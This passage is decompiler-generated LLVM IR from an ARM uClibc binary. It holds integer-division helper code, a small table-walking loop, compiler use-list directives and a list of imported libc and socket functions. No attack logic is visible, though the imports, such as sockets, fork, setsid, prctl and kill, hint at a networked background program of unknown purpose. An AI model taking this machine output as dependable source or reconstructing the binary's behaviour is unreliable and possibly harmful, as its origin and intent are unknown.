  %v0_121e854 = phi i32 [ %v1_121e0, %dec_label_pc_121dc ], [ %v2_121dc, %bb93 ]
  %v3_121e4 = udiv i32 %v0_121e4, 2
  br label %dec_label_pc_121e8

dec_label_pc_121e8:                               ; preds = %dec_label_pc_121d8, %bb94
  %v0_121f0 = phi i32 [ %v0_121e4, %dec_label_pc_121d8 ], [ %v3_121e4, %bb94 ]
  %v1_121ec = phi i32 [ %v1_121e0, %dec_label_pc_121d8 ], [ %v0_121e854, %bb94 ]
  %v3_121e8 = icmp ult i32 %v1_121ec, %v0_121f0
  br i1 %v3_121e8, label %bb96, label %bb95

bb95:                                             ; preds = %dec_label_pc_121e8
  %v2_121e8 = sub i32 %v1_121ec, %v0_121f0
  br label %bb96

bb96:                                             ; preds = %dec_label_pc_121e8, %bb95
  %v0_121f457 = phi i32 [ %v1_121ec, %dec_label_pc_121e8 ], [ %v2_121e8, %bb95 ]
  %v3_121f0 = udiv i32 %v0_121f0, 2
  br label %dec_label_pc_121f4

dec_label_pc_121f4:                               ; preds = %dec_label_pc_121d0, %bb96
  %v2_121f8 = phi i32 [ %v0_121e4, %dec_label_pc_121d0 ], [ %v3_121f0, %bb96 ]
  %v1_121f8 = phi i32 [ %v1_121e0, %dec_label_pc_121d0 ], [ %v0_121f457, %bb96 ]
  %v3_121f4 = icmp ult i32 %v1_121f8, %v2_121f8
  br i1 %v3_121f4, label %.thread6, label %bb97

bb97:                                             ; preds = %dec_label_pc_121f4
  %v2_121f4 = sub i32 %v1_121f8, %v2_121f8
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_121f4, %bb83, %.thread72, %dec_label_pc_121c4, %bb92, %bb97
  %v1_12200 = phi i32 [ %v1_121a0.v6_121a0.v6_121a8.v6_121b0, %dec_label_pc_121c4 ], [ 0, %bb92 ], [ %v1_121f8, %dec_label_pc_121f4 ], [ %v2_121f4, %bb97 ], [ %v3_12158, %.thread72 ], [ %v1_1214c, %bb83 ]
  br i1 %v1_12140, label %bb98, label %bb99

bb98:                                             ; preds = %.thread6
  %v2_12200 = sub i32 0, %v1_12200
  br label %bb99

bb99:                                             ; preds = %.thread6, %bb98
  %v1_12204 = phi i32 [ %v1_12200, %.thread6 ], [ %v2_12200, %bb98 ]
  ret i32 %v1_12204

dec_label_pc_12208:                               ; preds = %entry
  %v0_12208 = load i32, i32* @lr, align 4
  %v0_1220c = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_12208)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_121e4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_121c4, { 1, 0, 2 }
  uselistorder i32 %v7_121bc, { 1, 0 }
  uselistorder i32 %v3_121b8, { 1, 0 }
  uselistorder i32 %v1_121a0.v6_121a0.v6_121a8.v6_121b0, { 0, 1, 2, 7, 5, 6, 4, 3 }
  uselistorder i32 %v4_121ac, { 1, 0 }
  uselistorder i32 %v4_121a4, { 1, 0 }
  uselistorder i32 %v4_1219c, { 1, 0 }
  uselistorder i32 %v6_121bc, { 3, 0, 2, 1 }
  uselistorder i32 %v2_1218c, { 1, 0 }
  uselistorder i32 %v1_12180, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_1217c, { 1, 0, 3, 2 }
  uselistorder i32 %v4_1216c, { 1, 0, 3, 2 }
  uselistorder i32 %v0_12178.pr35108, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1214c, { 0, 2, 3, 1, 4, 6, 5 }
  uselistorder i32 %v4_12154, { 1, 0, 2, 3, 5, 4, 6, 7 }
  uselistorder i32 ()* @__aeabi_ldiv0, { 2, 1, 0 }
  uselistorder i32* @lr, { 4, 5, 6, 2, 0, 3, 1 }
  uselistorder i32 -2, { 0, 12, 1, 13, 2, 3, 8, 10, 9, 7, 6, 5, 4, 14, 15, 16, 17, 11 }
  uselistorder i32 8, { 7, 8, 33, 16, 9, 10, 15, 11, 18, 39, 19, 12, 13, 14, 34, 27, 35, 24, 36, 25, 37, 26, 38, 17, 40, 41, 42, 43, 45, 28, 46, 29, 47, 48, 44, 52, 20, 53, 54, 55, 56, 57, 58, 59, 60, 61, 3, 62, 63, 64, 4, 65, 66, 67, 68, 69, 70, 71, 5, 72, 73, 74, 75, 76, 77, 78, 6, 79, 80, 81, 82, 83, 84, 90, 91, 92, 93, 94, 85, 21, 86, 22, 87, 23, 88, 30, 89, 0, 1, 32, 49, 50, 31, 51, 2 }
  uselistorder i32 3, { 57, 21, 58, 22, 142, 59, 38, 23, 25, 60, 41, 61, 2, 62, 63, 64, 65, 39, 4, 66, 67, 68, 1, 24, 69, 42, 70, 40, 71, 43, 26, 44, 45, 0, 72, 73, 46, 75, 76, 77, 78, 79, 80, 47, 81, 48, 82, 27, 83, 84, 85, 86, 87, 6, 5, 49, 28, 88, 89, 90, 91, 92, 93, 94, 8, 7, 50, 95, 29, 96, 97, 98, 99, 100, 101, 102, 103, 10, 9, 51, 104, 30, 105, 106, 107, 108, 109, 12, 11, 52, 110, 31, 111, 112, 113, 114, 53, 115, 14, 13, 33, 116, 32, 117, 118, 119, 120, 54, 121, 16, 15, 35, 122, 34, 123, 124, 125, 126, 127, 128, 129, 130, 18, 17, 55, 131, 36, 132, 134, 135, 136, 137, 138, 139, 20, 19, 56, 140, 37, 141, 133, 3, 74 }
  uselistorder i32 2, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 124, 13, 14, 15, 16, 17, 73, 74, 53, 54, 64, 140, 75, 78, 129, 77, 130, 134, 65, 126, 66, 127, 67, 128, 68, 131, 69, 132, 70, 133, 71, 139, 135, 136, 137, 138, 60, 79, 141, 18, 19, 142, 143, 80, 144, 56, 125, 52, 145, 76, 146, 20, 81, 220, 85, 147, 83, 148, 84, 149, 82, 86, 150, 21, 22, 23, 87, 151, 61, 88, 89, 90, 91, 62, 93, 94, 92, 95, 152, 55, 59, 153, 154, 155, 221, 222, 157, 158, 159, 160, 161, 162, 163, 97, 164, 96, 165, 166, 167, 168, 169, 99, 98, 170, 171, 172, 173, 174, 175, 176, 101, 177, 100, 178, 179, 102, 103, 104, 180, 181, 182, 183, 184, 185, 186, 0, 24, 25, 26, 27, 28, 29, 105, 187, 72, 188, 189, 190, 191, 192, 1, 30, 31, 32, 33, 34, 35, 107, 106, 193, 194, 36, 195, 196, 109, 198, 57, 197, 48, 49, 2, 37, 38, 39, 40, 41, 110, 199, 108, 200, 201, 42, 202, 203, 112, 205, 58, 204, 50, 51, 3, 43, 44, 45, 46, 47, 113, 206, 111, 207, 208, 114, 115, 116, 209, 210, 211, 212, 213, 214, 215, 216, 118, 217, 117, 218, 223, 224, 225, 120, 226, 121, 227, 228, 229, 230, 122, 231, 119, 232, 219, 123, 63, 156 }
  uselistorder i32 4, { 6, 7, 44, 8, 9, 45, 331, 332, 139, 10, 11, 71, 53, 214, 204, 40, 74, 146, 75, 147, 76, 148, 168, 169, 170, 160, 161, 171, 172, 149, 150, 140, 141, 142, 143, 144, 145, 151, 152, 153, 154, 155, 156, 157, 158, 159, 73, 163, 164, 165, 162, 46, 173, 54, 77, 78, 12, 174, 13, 175, 176, 14, 15, 177, 178, 35, 179, 36, 166, 72, 167, 184, 79, 186, 80, 187, 81, 188, 189, 185, 180, 82, 181, 182, 183, 314, 190, 43, 42, 41, 191, 83, 16, 17, 18, 19, 20, 21, 192, 37, 193, 38, 194, 195, 196, 0, 84, 22, 205, 206, 98, 207, 208, 209, 99, 100, 86, 210, 85, 212, 55, 213, 215, 101, 216, 217, 102, 103, 218, 56, 219, 57, 220, 221, 104, 105, 222, 106, 223, 224, 107, 108, 47, 225, 58, 226, 59, 227, 228, 229, 230, 231, 87, 232, 60, 233, 234, 235, 109, 236, 237, 238, 239, 110, 111, 2, 240, 88, 241, 61, 242, 243, 244, 112, 245, 246, 113, 114, 3, 48, 247, 62, 249, 63, 250, 251, 115, 252, 253, 254, 255, 256, 116, 117, 257, 258, 89, 259, 4, 49, 260, 64, 261, 90, 262, 263, 118, 264, 265, 266, 267, 268, 119, 120, 269, 270, 91, 271, 5, 50, 272, 65, 273, 92, 274, 275, 276, 277, 278, 93, 279, 66, 280, 281, 282, 283, 284, 121, 285, 286, 287, 122, 123, 94, 288, 51, 67, 289, 68, 290, 315, 316, 317, 318, 319, 95, 320, 96, 321, 124, 322, 323, 324, 125, 126, 97, 325, 52, 326, 69, 327, 70, 329, 127, 291, 292, 23, 128, 293, 294, 24, 129, 295, 296, 25, 130, 297, 298, 26, 131, 299, 300, 27, 132, 301, 302, 28, 303, 133, 304, 305, 29, 134, 306, 307, 30, 135, 308, 309, 31, 136, 310, 311, 32, 137, 312, 313, 33, 328, 248, 197, 198, 199, 34, 200, 201, 1, 202, 138, 203, 211, 330, 39 }
  uselistorder i32 16, { 5, 6, 7, 8, 9, 25, 10, 11, 0, 12, 13, 43, 82, 31, 83, 32, 44, 80, 81, 84, 85, 86, 26, 79, 87, 14, 15, 24, 76, 16, 88, 17, 45, 30, 89, 33, 90, 34, 46, 47, 48, 49, 50, 51, 52, 53, 91, 54, 92, 55, 93, 56, 57, 94, 59, 60, 61, 62, 58, 63, 27, 96, 97, 98, 99, 64, 100, 101, 102, 103, 104, 105, 65, 106, 107, 108, 36, 109, 35, 110, 111, 67, 112, 113, 114, 115, 116, 1, 66, 117, 118, 119, 69, 120, 121, 122, 123, 124, 2, 68, 125, 70, 126, 127, 128, 18, 129, 19, 130, 77, 20, 71, 72, 131, 132, 3, 38, 133, 37, 134, 73, 135, 136, 137, 21, 138, 22, 139, 78, 23, 74, 75, 140, 141, 4, 40, 142, 39, 143, 42, 144, 41, 145, 146, 147, 148, 149, 28, 150, 151, 152, 153, 155, 154, 156, 157, 158, 159, 160, 161, 162, 29, 163, 164, 165, 166, 167, 169, 168, 170, 171, 95 }
  uselistorder i32 268435455, { 2, 0, 3, 1, 4 }
  uselistorder i32 %arg2, { 3, 2, 1, 0 }
  uselistorder label %bb99, { 1, 0 }
  uselistorder label %.thread6, { 5, 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_121f4, { 1, 0 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_121e8, { 1, 0 }
  uselistorder label %bb94, { 1, 0 }
  uselistorder label %bb91, { 1, 0 }
  uselistorder label %bb89, { 1, 0 }
  uselistorder label %dec_label_pc_12194, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %.thread70, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
}

define i32 @__aeabi_ldiv0() local_unnamed_addr {
entry:
  %v1_12218 = load i32, i32* @r0, align 4
  ret i32 %v1_12218
}

define i32 @function_1221c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1221c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12220 = load i32, i32* @global_var_1a4f4.437, align 4
  %v2_12224 = icmp eq i32 %v3_12220, -1
  %v3_12228 = load i32, i32* @r4, align 4
  store i32 %v3_12228, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_1a4f4.437 to i32), i32* %r4.global-to-local, align 4
  br i1 %v2_12224, label %bb, label %.preheader

bb:                                               ; preds = %dec_label_pc_1221c
  store i32 %v3_12228, i32* %r4.global-to-local, align 4
  %v9_12230 = load i32, i32* @r0, align 4
  ret i32 %v9_12230

.preheader:                                       ; preds = %dec_label_pc_1221c, %.preheader
  %v0_12238 = phi i32 [ %v3_1223c, %.preheader ], [ %v3_12220, %dec_label_pc_1221c ]
  call void @__pseudo_branch(i32 %v0_12238)
  %v0_1223c = load i32, i32* %r4.global-to-local, align 4
  %v1_1223c = add i32 %v0_1223c, -4
  %v2_1223c = inttoptr i32 %v1_1223c to i32*
  %v3_1223c = load i32, i32* %v2_1223c, align 4
  store i32 %v1_1223c, i32* %r4.global-to-local, align 4
  %v3_12240 = icmp eq i32 %v3_1223c, -1
  br i1 %v3_12240, label %dec_label_pc_12248, label %.preheader

dec_label_pc_12248:                               ; preds = %.preheader
  %v2_12248 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12248, i32* %r4.global-to-local, align 4
  %v8_12248 = load i32, i32* @r0, align 4
  ret i32 %v8_12248

; uselistorder directives
  uselistorder i32 %v3_1223c, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32 -4, { 4, 0, 1, 3, 2 }
  uselistorder i32 -1, { 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 0, 1, 2, 27, 30, 31, 3, 52, 53, 54, 166, 167, 55, 56, 57, 58, 59, 60, 61, 163, 164, 62, 63, 64, 65, 66, 67, 68, 69, 70, 161, 32, 162, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 165, 85, 4, 86, 87, 5, 88, 89, 90, 91, 92, 33, 168, 93, 94, 169, 95, 96, 6, 97, 35, 170, 7, 37, 171, 98, 36, 172, 99, 100, 38, 173, 8, 101, 102, 103, 104, 105, 106, 16, 107, 108, 9, 11, 10, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 17, 120, 121, 122, 123, 124, 125, 18, 126, 127, 128, 129, 19, 34, 130, 131, 20, 132, 133, 134, 12, 28, 21, 135, 136, 137, 22, 138, 139, 140, 23, 142, 141, 14, 143, 144, 24, 146, 145, 15, 147, 148, 13, 29, 25, 149, 150, 151, 26, 152, 153, 154, 155, 156, 157, 158, 159, 160, 39, 40, 41 }
  uselistorder i32 1, { 425, 163, 294, 744, 745, 295, 746, 747, 241, 748, 589, 590, 591, 252, 592, 428, 427, 426, 179, 187, 182, 183, 185, 184, 181, 180, 186, 0, 580, 581, 582, 583, 262, 620, 621, 263, 622, 430, 429, 236, 237, 593, 594, 595, 331, 431, 13, 12, 11, 9, 10, 726, 275, 276, 1, 2, 727, 542, 544, 543, 332, 596, 242, 235, 234, 728, 164, 597, 598, 599, 22, 21, 23, 623, 432, 215, 212, 216, 214, 217, 219, 218, 213, 649, 650, 433, 74, 73, 72, 71, 75, 76, 624, 625, 434, 205, 204, 203, 202, 206, 207, 526, 343, 527, 548, 344, 345, 533, 534, 539, 340, 520, 521, 342, 522, 523, 341, 524, 525, 528, 339, 529, 530, 338, 531, 532, 337, 535, 536, 336, 537, 538, 335, 540, 541, 549, 346, 257, 550, 347, 551, 553, 554, 552, 555, 348, 556, 519, 277, 559, 557, 349, 558, 333, 545, 334, 546, 296, 547, 561, 350, 562, 563, 289, 564, 565, 256, 278, 571, 572, 253, 351, 448, 447, 446, 445, 444, 443, 442, 441, 440, 439, 438, 437, 436, 435, 8, 80, 78, 79, 85, 88, 81, 82, 84, 83, 87, 86, 566, 567, 352, 568, 569, 353, 570, 449, 57, 58, 56, 50, 49, 53, 55, 54, 52, 48, 51, 560, 354, 451, 450, 232, 233, 231, 730, 264, 729, 288, 452, 29, 30, 28, 26, 25, 32, 33, 24, 27, 31, 626, 454, 453, 201, 199, 198, 197, 196, 200, 455, 357, 297, 573, 574, 298, 575, 355, 356, 358, 576, 577, 359, 360, 361, 363, 362, 364, 365, 366, 467, 466, 465, 464, 463, 462, 461, 460, 459, 423, 458, 457, 456, 15, 18, 16, 17, 20, 19, 254, 367, 299, 578, 368, 369, 468, 372, 371, 370, 579, 470, 469, 77, 373, 584, 282, 585, 281, 586, 587, 374, 243, 279, 588, 375, 376, 377, 378, 379, 380, 381, 382, 255, 383, 483, 482, 481, 480, 479, 478, 477, 476, 475, 474, 473, 472, 471, 223, 222, 220, 225, 226, 224, 221, 605, 4, 600, 384, 601, 3, 602, 290, 603, 258, 259, 604, 606, 291, 607, 488, 487, 486, 419, 485, 420, 484, 34, 35, 731, 300, 732, 301, 733, 5, 734, 6, 7, 627, 628, 629, 630, 631, 632, 260, 261, 633, 634, 635, 636, 637, 638, 639, 640, 385, 641, 642, 386, 643, 644, 647, 645, 646, 491, 490, 489, 98, 103, 102, 99, 95, 97, 96, 105, 106, 109, 107, 100, 108, 104, 101, 651, 652, 653, 654, 655, 387, 265, 388, 493, 492, 141, 137, 133, 131, 132, 130, 139, 140, 134, 138, 135, 136, 656, 657, 658, 389, 659, 660, 661, 662, 663, 664, 390, 665, 266, 391, 303, 302, 392, 666, 494, 64, 62, 60, 61, 59, 67, 68, 70, 69, 66, 65, 63, 667, 292, 245, 668, 393, 670, 669, 244, 394, 305, 304, 421, 495, 227, 228, 230, 229, 671, 672, 673, 674, 675, 676, 395, 677, 267, 396, 397, 678, 306, 679, 496, 40, 37, 36, 38, 39, 44, 45, 47, 46, 42, 43, 41, 680, 681, 283, 682, 683, 684, 398, 685, 268, 399, 308, 307, 400, 687, 401, 688, 497, 90, 94, 91, 92, 93, 89, 689, 690, 284, 691, 692, 693, 402, 694, 246, 247, 269, 403, 313, 312, 404, 695, 309, 696, 310, 697, 311, 698, 502, 501, 500, 499, 498, 143, 148, 144, 145, 146, 142, 149, 147, 699, 700, 285, 701, 702, 703, 405, 704, 248, 249, 270, 406, 321, 320, 407, 705, 319, 706, 318, 707, 314, 708, 315, 709, 316, 710, 408, 711, 317, 712, 507, 506, 505, 504, 503, 189, 192, 193, 194, 195, 188, 191, 190, 713, 293, 251, 714, 409, 716, 715, 250, 410, 323, 322, 422, 508, 208, 209, 211, 210, 717, 718, 719, 286, 720, 721, 722, 271, 411, 326, 325, 412, 723, 324, 724, 509, 114, 113, 112, 110, 119, 117, 116, 118, 120, 111, 115, 735, 736, 737, 287, 738, 739, 740, 272, 413, 329, 328, 414, 741, 327, 742, 514, 513, 512, 511, 510, 156, 155, 154, 153, 151, 150, 159, 158, 161, 162, 152, 160, 157, 725, 330, 415, 515, 122, 121, 127, 125, 128, 124, 126, 129, 123, 743, 14, 686, 166, 608, 416, 611, 417, 612, 613, 609, 610, 614, 615, 616, 617, 273, 618, 274, 167, 171, 173, 168, 169, 170, 172, 619, 280, 418, 516, 176, 177, 175, 174, 178, 648, 165, 517, 518, 240, 239, 238, 424 }
  uselistorder label %.preheader, { 1, 0 }
}

define i32 @function_12250() local_unnamed_addr {
dec_label_pc_12250:
  %v5_12254 = load i32, i32* @r0, align 4
  ret i32 %v5_12254

; uselistorder directives
  uselistorder i32* @r0, { 5, 7, 8, 11, 77, 12, 78, 13, 79, 15, 14, 9, 47, 0, 10, 48, 49, 2, 20, 21, 22, 25, 26, 27, 28, 29, 3, 23, 24, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 50, 51, 52, 53, 54, 55, 56, 1, 57, 58, 59, 60, 61, 62, 63, 73, 74, 4, 64, 65, 66, 67, 68, 69, 70, 71, 72, 75, 76, 6, 16, 17, 18, 19 }
}

define i32 @function_12258() local_unnamed_addr {
entry:
  %v3_1225c = load i32, i32* @r4, align 4
  %v0_12264 = call i32 @function_8ddc()
  call void @__pseudo_branch(i32 %v3_1225c)
  ret i32 %v0_12264

; uselistorder directives
  uselistorder void (i32)* @__pseudo_branch, { 1, 6, 8, 9, 10, 2, 3, 4, 0, 5, 7 }
  uselistorder i32 0, { 0, 757, 66, 758, 759, 182, 181, 435, 55, 56, 57, 58, 437, 436, 34, 33, 67, 760, 761, 762, 763, 765, 764, 1, 766, 767, 184, 183, 438, 59, 60, 61, 62, 440, 439, 36, 35, 32, 41, 768, 441, 2, 769, 770, 63, 771, 772, 773, 774, 775, 93, 442, 445, 443, 444, 776, 446, 75, 94, 557, 558, 64, 559, 560, 561, 450, 3, 187, 95, 96, 223, 37, 97, 4, 6, 5, 230, 54, 562, 563, 734, 733, 735, 736, 30, 98, 737, 101, 100, 99, 224, 225, 226, 103, 102, 231, 564, 565, 104, 738, 739, 76, 105, 566, 106, 489, 107, 616, 617, 108, 587, 588, 468, 109, 110, 495, 490, 68, 491, 492, 469, 470, 471, 472, 479, 462, 451, 236, 463, 464, 452, 238, 465, 466, 453, 237, 467, 485, 486, 473, 474, 475, 454, 235, 476, 477, 455, 234, 478, 480, 456, 233, 481, 488, 457, 232, 482, 487, 483, 38, 185, 186, 484, 447, 493, 239, 494, 189, 496, 240, 497, 500, 501, 112, 188, 498, 499, 241, 242, 502, 503, 504, 505, 458, 47, 243, 507, 508, 509, 510, 511, 512, 513, 514, 244, 515, 65, 516, 77, 517, 449, 518, 519, 520, 521, 522, 523, 448, 524, 525, 526, 111, 245, 246, 527, 530, 531, 532, 533, 534, 9, 113, 528, 114, 529, 7, 115, 506, 589, 590, 535, 536, 247, 537, 538, 539, 116, 540, 541, 542, 543, 544, 545, 546, 248, 48, 249, 547, 8, 548, 196, 549, 550, 250, 251, 551, 552, 252, 227, 120, 119, 459, 228, 122, 121, 460, 461, 229, 118, 117, 190, 195, 191, 193, 194, 253, 123, 553, 554, 555, 556, 124, 125, 254, 567, 568, 569, 570, 571, 71, 572, 574, 573, 69, 70, 126, 192, 255, 575, 197, 198, 199, 72, 127, 42, 128, 591, 81, 80, 78, 79, 592, 593, 43, 594, 595, 596, 597, 598, 129, 599, 600, 256, 601, 602, 603, 604, 133, 130, 131, 132, 605, 606, 607, 608, 257, 609, 610, 202, 612, 201, 613, 200, 614, 258, 615, 618, 619, 84, 82, 83, 44, 620, 621, 622, 623, 134, 624, 625, 259, 203, 626, 260, 627, 628, 629, 630, 631, 88, 85, 86, 87, 45, 632, 633, 634, 135, 635, 136, 636, 637, 206, 638, 205, 639, 204, 640, 261, 641, 141, 263, 139, 140, 137, 138, 642, 143, 142, 144, 262, 644, 645, 92, 89, 90, 91, 46, 643, 646, 647, 648, 649, 650, 651, 10, 11, 12, 13, 14, 652, 653, 145, 264, 654, 265, 655, 266, 656, 267, 657, 268, 658, 269, 659, 270, 660, 207, 661, 146, 147, 148, 663, 664, 662, 666, 667, 665, 15, 16, 17, 18, 19, 668, 149, 669, 670, 209, 671, 271, 674, 272, 675, 273, 676, 274, 677, 275, 678, 276, 679, 208, 680, 277, 681, 151, 150, 152, 683, 684, 682, 685, 686, 39, 278, 692, 688, 689, 690, 691, 49, 50, 20, 21, 22, 23, 24, 687, 153, 73, 693, 694, 214, 695, 213, 696, 212, 697, 211, 698, 210, 699, 279, 700, 280, 701, 155, 154, 156, 703, 704, 702, 705, 706, 40, 281, 712, 708, 709, 710, 711, 51, 52, 25, 26, 27, 28, 29, 707, 157, 74, 713, 714, 216, 715, 215, 716, 282, 717, 162, 284, 160, 161, 158, 159, 718, 164, 163, 285, 286, 165, 283, 166, 169, 168, 167, 721, 722, 720, 719, 287, 724, 723, 725, 170, 726, 727, 219, 728, 218, 729, 217, 730, 288, 731, 171, 174, 173, 172, 742, 743, 741, 740, 289, 745, 744, 746, 747, 175, 222, 748, 221, 749, 220, 750, 290, 753, 732, 751, 176, 752, 672, 177, 673, 576, 178, 577, 578, 179, 291, 579, 580, 31, 581, 582, 583, 584, 585, 292, 586, 180, 611, 756, 754, 53, 755, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789 }
  uselistorder i32* @r4, { 20, 422, 118, 119, 120, 121, 48, 49, 184, 185, 186, 146, 147, 148, 21, 22, 23, 24, 50, 51, 25, 28, 29, 26, 27, 30, 31, 32, 33, 34, 35, 36, 37, 52, 53, 38, 39, 54, 55, 56, 57, 58, 59, 40, 41, 42, 43, 44, 45, 46, 47, 62, 63, 64, 65, 66, 67, 68, 0, 69, 60, 61, 398, 399, 400, 401, 149, 150, 151, 152, 153, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 2, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 122, 123, 124, 1, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 3, 203, 4, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 5, 226, 6, 227, 7, 228, 8, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 9, 249, 10, 250, 11, 251, 12, 252, 253, 254, 13, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 14, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 15, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 16, 381, 17, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 402, 18, 403, 19, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 418, 419, 420, 396, 397, 415, 416, 417, 139, 137, 138, 140, 141, 142, 143, 144, 145, 421, 423 }
}

declare i8* @strcpy(i8*, i8*) local_unnamed_addr

declare i32 @ioctl(i32, i32, ...) local_unnamed_addr

declare i32 @recv(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @connect(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @sigemptyset(%_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32* @memmove(i32*, i32*, i32) local_unnamed_addr

declare i32 @getpid() local_unnamed_addr

declare i32 @prctl(i32, i32, i32, i32, i32) local_unnamed_addr

declare i32* @memcpy(i32*, i32*, i32) local_unnamed_addr

declare i32 @readlink(i8*, i8*, i32) local_unnamed_addr

declare i32* @malloc(i32) local_unnamed_addr

declare i32 @sleep(i32) local_unnamed_addr

declare i32 @recvfrom(i32, i32*, i32, i32, %sockaddr*, i32*) local_unnamed_addr

declare i32 @socket(i32, i32, i32) local_unnamed_addr

declare i32 @select(i32, %_TYPEDEF_fd_set*, %_TYPEDEF_fd_set*, %_TYPEDEF_fd_set*, %timeval*) local_unnamed_addr

declare %dirent* @readdir(%__dirstream*) local_unnamed_addr

declare i32 @sigaddset(%_TYPEDEF_sigset_t*, i32) local_unnamed_addr

declare i32 @send(i32, i32*, i32, i32) local_unnamed_addr

declare void @abort() local_unnamed_addr

declare i32 @accept(i32, %sockaddr*, i32*) local_unnamed_addr

declare i32* @calloc(i32, i32) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @kill(i32, i32) local_unnamed_addr

declare i32 @bind(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @inet_addr(i8*) local_unnamed_addr

declare i32 @setsockopt(i32, i32, i32, i32*, i32) local_unnamed_addr

declare void (i32)* @signal(i32, void (i32)*) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @unlink(i8*) local_unnamed_addr

declare i32 @sendto(i32, i32*, i32, i32, %sockaddr*, i32) local_unnamed_addr

declare i32* @realloc(i32*, i32) local_unnamed_addr

declare i32 @listen(i32, i32) local_unnamed_addr

declare i32 @fork() local_unnamed_addr

declare i32 @__uClibc_main() local_unnamed_addr

declare i32* @memset(i32*, i32, i32) local_unnamed_addr

declare i32 @getppid() local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare %__dirstream* @opendir(i8*) local_unnamed_addr

declare i32 @getsockopt(i32, i32, i32, i32*, i32*) local_unnamed_addr

declare i32* @__errno_location() local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @atoi(i8*) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @clock() local_unnamed_addr

declare i32 @setsid() local_unnamed_addr

declare i32 @closedir(%__dirstream*) local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare void @free(i32*) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @getsockname(i32, %sockaddr*, i32*) local_unnamed_addr

define i32 @__data_start(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_1a680 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1a680, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %arg1

; uselistorder directives
